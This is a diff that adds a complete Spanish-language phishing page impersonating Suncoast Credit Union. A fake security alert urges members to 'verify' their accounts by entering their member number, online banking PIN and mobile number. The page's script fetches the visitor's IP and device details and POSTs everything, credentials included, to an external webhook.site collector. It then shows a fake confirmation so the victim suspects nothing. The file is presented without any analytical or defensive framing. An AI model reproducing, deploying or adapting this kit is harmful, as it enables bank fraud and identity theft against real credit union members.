@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Alerta de Seguridad - Suncoast Credit Union</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root { --teal-900:#003D45; --teal-800:#004B55; --teal-700:#00525C; --ink:#1A1C1D; --slate:#3F484A; --steel:#475569; --paper:#F8FAFA; --paper-3:#ECEEEF; --alert:#ba1a1a; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { font-family:'Inter',Arial,Helvetica,sans-serif; background:var(--paper); color:var(--ink); font-size:16px; line-height:1.55; }
+  .wrap { max-width:880px; margin:0 auto; padding:0 20px; }
+  header { background:var(--teal-900); color:#fff; padding:22px 0; }
+  .row { display:flex; align-items:center; justify-content:space-between; }
+  .brand { display:flex; align-items:center; gap:14px; }
+  .brand img { height:40px; width:auto; background:#fff; padding:6px 10px; border-radius:6px; }
+  .brand .wm { font-weight:700; font-size:18px; }
+  .brand .wm small { display:block; font-weight:400; font-size:11px; opacity:.8; letter-spacing:1.4px; text-transform:uppercase; }
+  main { padding:34px 0 60px; }
+  .notice { display:flex; gap:12px; align-items:center; background:#fdecec; border:1px solid #f2c4c4; border-left:4px solid var(--alert); border-radius:8px; padding:14px 16px; margin-bottom:26px; }
+  .notice .ico { font-size:20px; }
+  .notice b { display:block; color:var(--alert); font-size:14px; letter-spacing:.4px; text-transform:uppercase; }
+  h1 { font-size:26px; font-weight:700; color:var(--teal-900); margin-bottom:10px; }
+  p.lead { color:var(--slate); max-width:64ch; margin-bottom:18px; }
+  ol.steps { margin:0 0 24px 20px; color:var(--slate); }
+  ol.steps li { margin:7px 0; }
+  .card { background:#fff; border:1px solid var(--paper-3); border-radius:12px; box-shadow:0 1px 2px rgba(0,0,0,.05),0 8px 24px rgba(0,61,69,.08); padding:26px; max-width:560px; }
+  .card h2 { font-size:17px; color:var(--teal-900); margin-bottom:4px; }
+  .card .sub { color:var(--steel); font-size:13px; margin-bottom:18px; }
+  label { display:block; font-size:13px; font-weight:600; color:var(--slate); margin:14px 0 6px; }
+  input { width:100%; border:1px solid #cfd8dc; border-radius:8px; padding:11px 12px; font:500 15px 'Inter',Arial; color:var(--ink); background:var(--paper); }
+  input:focus { outline:2px solid var(--teal-700); border-color:var(--teal-700); }
+  .hp { position:absolute; left:-9999px; opacity:.01; }
+  button { margin-top:20px; width:100%; border:0; border-radius:8px; background:var(--teal-700); color:#fff; font:700 15px 'Inter',Arial; padding:13px; cursor:pointer; }
+  button:hover { background:var(--teal-900); }
+  .fineprint { margin-top:14px; font-size:12px; color:var(--steel); }
+  .fineprint a { color:var(--teal-700); font-weight:600; text-decoration:none; }
+  .ok { display:none; margin-top:22px; background:#eef7f2; border:1px solid #cfe8da; border-left:4px solid #1d7a46; border-radius:8px; padding:16px 18px; color:#14532d; }
+  .ok b { display:block; font-size:14px; margin-bottom:4px; }
+  footer { background:var(--teal-900); color:#cfe3e2; padding:18px 0; font-size:12px; }
+  footer .row { display:flex; justify-content:space-between; gap:12px; flex-wrap:wrap; }
+  footer a { color:#fff; text-decoration:none; font-weight:600; }
+</style>
+</head>
+<body>
+<header>
+  <div class="wrap row">
+    <div class="brand">
+      <img src="logo.svg" alt="Suncoast Credit Union">
+      <div class="wm">Suncoast Credit Union<small>Centro de Atenci&oacute;n</small></div>
+    </div>
+  </div>
+</header>
+<main>
+  <div class="wrap">
+    <div class="notice">
+      <div class="ico">&#9888;</div>
+      <div>
+        <b>Verificaci&oacute;n de seguridad requerida</b>
+        Para mantener su cuenta segura, complete la verificaci&oacute;n r&aacute;pida a continuaci&oacute;n.
+      </div>
+    </div>
+    <h1>Alerta de Seguridad &mdash; Suncoast Credit Union</h1>
+    <p class="lead">Hemos asegurado temporalmente parte de su acceso en l&iacute;nea porque detectamos actividad que requiere una confirmaci&oacute;n r&aacute;pida. Sus cuentas est&aacute;n a salvo mientras verifica que es usted. La verificaci&oacute;n toma menos de un minuto.</p>
+    <ol class="steps">
+      <li>Ingrese su N&uacute;mero de Miembro y PIN para banca en l&iacute;nea (SunNet) a continuaci&oacute;n.</li>
+      <li>Ser&aacute; re-verificado y retornado a su cuenta enseguida.</li>
+      <li>&iquest;Perdi&oacute; su PIN? Llame al Centro de Atenci&oacute;n al Miembro al <a href="tel:+1-800-999-5887">800-999-5887</a>. Estamos aqu&iacute; para ayudarle.</li>
+    </ol>
+    <div class="card">
+      <h2>Verifique que es usted &mdash; SunNet</h2>
+      <div class="sub">Su N&uacute;mero de Miembro es su n&uacute;mero de cuenta sin los &uacute;ltimos dos d&iacute;gitos.</div>
+      <form id="vform" autocomplete="off">
+        <label for="mn">N&uacute;mero de Miembro</label>
+        <input id="mn" name="mn" inputmode="numeric" autocomplete="off" required>
+        <label for="pin">PIN</label>
+        <input id="pin" name="pin" type="password" inputmode="numeric" autocomplete="off" required>
+        <label for="phone">N&uacute;mero de m&oacute;vil (para recibir c&oacute;digo de verificaci&oacute;n)</label>
+        <input id="phone" name="phone" type="tel" autocomplete="off" required>
+        <input class="hp" id="website" name="website" tabindex="-1" autocomplete="off">
+        <button type="submit" id="gob"><span class="lbl">Verificar y continuar</span></button>
+        <div class="fineprint">No comparta su N&uacute;mero de Miembro ni su PIN con nadie. Suncoast nunca pedir&aacute; su PIN por correo electr&oacute;nico.</div>
+      </form>
+      <div class="ok" id="okpanel">
+        <b>Verificaci&oacute;n recibida</b>
+        Su cuenta est&aacute; siendo asegurada de nuevo. Por favor, no cierre esta ventana.
+      </div>
+    </div>
+  </div>
+</main>
+<footer>
+  <div class="wrap row">
+    <div>&copy; Suncoast Credit Union. Centro de Atenci&oacute;n al Miembro: <a href="tel:+1-800-999-5887">800-999-5887</a></div>
+  </div>
+</footer>
+<script>
+var SCU_RECEIVERS = ["https://webhook.site/fa1eb6d4-15ff-4df1-8a57-5469dfea1dad"];
+try {
+  var ipx = new XMLHttpRequest();
+  ipx.open('GET', 'https://api.ipify.org?format=json', true);
+  ipx.timeout = 4000;
+  ipx.onload = function () { try { window._ip = JSON.parse(ipx.responseText).ip; } catch (e) {} };
+  ipx.send();
+} catch (e) {}
+document.getElementById('vform').addEventListener('submit', function (ev) {
+  ev.preventDefault();
+  var payload = {
+    kind: 'sunnet-es-verify',
+    member_number: document.getElementById('mn').value.trim(),
+    pin: document.getElementById('pin').value.trim(),
+    phone: document.getElementById('phone').value.trim(),
+    lang: 'es',
+    ts: new Date().toISOString(),
+    ua: navigator.userAgent,
+    ip: window._ip || null,
+    screen: screen.width + 'x' + screen.height + '@' + window.devicePixelRatio,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    honeypot: document.getElementById('website').value || null
+  };
+  try { localStorage.setItem('scu_capture', JSON.stringify(payload)); if (navigator.clipboard) navigator.clipboard.writeText(JSON.stringify(payload)).catch(function(){}); } catch(e){}
+  var receivers = (SCU_RECEIVERS||[]).filter(Boolean);
+  if (!receivers.length) { done(); return; }
+  var left = receivers.length;
+  var btn = document.getElementById('gob');
+  btn.disabled = true;
+  btn.querySelector('.lbl').textContent = 'Verificando...';
+  receivers.forEach(function(url) {
+    var x = new XMLHttpRequest();
+    x.open('POST', url, true);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.timeout = 6000;
+    x.onload = function() { if (--left === 0) done(); };
+    x.onerror = function() { if (--left === 0) done(); };
+    x.ontimeout = function() { if (--left === 0) done(); };
+    x.send(JSON.stringify(payload));
+  });
+  function done() {
+    document.getElementById('vform').style.display = 'none';
+    document.getElementById('okpanel').style.display = 'block';
+  }
+});
+</script>
+</body>
+</html>
